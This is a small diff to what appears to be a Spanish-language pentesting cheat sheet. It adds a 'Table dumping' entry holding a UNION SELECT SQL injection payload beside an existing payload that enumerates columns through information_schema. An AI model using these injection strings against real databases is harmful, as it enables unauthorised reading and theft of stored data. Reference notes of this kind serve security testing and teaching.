@@ -91,6 +91,10 @@ Columns enumeration una vez encontrada una columna
 ```
 UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%' and COLUMN_NAME !='nombre_tabla_encontrada';
 ```
+Table dumping
+```
+UNION SELECT 1,2,3 from nombre_tabla where nombre_columna like '%' and nombre_columna like '%'; - --
+```
 
 # Powershell
 
